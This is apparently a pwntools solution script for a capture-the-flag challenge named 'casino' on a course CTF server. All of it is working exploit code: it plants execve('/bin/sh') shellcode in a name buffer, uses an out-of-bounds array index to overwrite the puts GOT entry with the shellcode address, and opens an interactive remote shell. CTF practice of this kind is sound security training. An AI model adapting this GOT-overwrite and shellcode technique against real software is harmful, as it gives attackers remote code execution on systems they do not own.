import binascii
from pwn import *

context.arch = 'amd64'

# p = process('./casino')
p = remote('edu-ctf.csie.org', 10172)

# GOT table: 0x602000
#   plt@puts: 0x602020

# lottery -> 0x6020b0
# guess -> 0x6020d0
# name -> 0x6020f0
# seed -> 0x602100

ret = p64(0x6020f0 + 32)

sc = asm(
    shellcraft.pushstr('/bin/sh') +
    shellcraft.execve('rsp', 0, 0))

print(sc)
print(len(sc))


p.sendlineafter('name: ', b'A' * 16 + b'\0' * 16 + sc)
p.sendlineafter('age: ', b'123')

for i in range(6):
    p.sendlineafter(b'Chose the number', b'0')
p.sendlineafter(b'Change the number?', b'1')

dest = (0x602020 - 0x6020d0) // 4 + 1
print(dest)
p.sendlineafter(b'Which number', str(dest))
p.sendlineafter(b'Chose the number', str(0x6020f0 + 32))

for i in [83, 86, 77, 15, 93, 35]:
    p.sendlineafter(b'Chose the number', str(i))
p.sendlineafter(b'Change the number?', b'1')

p.sendlineafter(b'Which number', str(dest + 1))
p.sendlineafter(b'Chose the number', '0')

p.interactive()
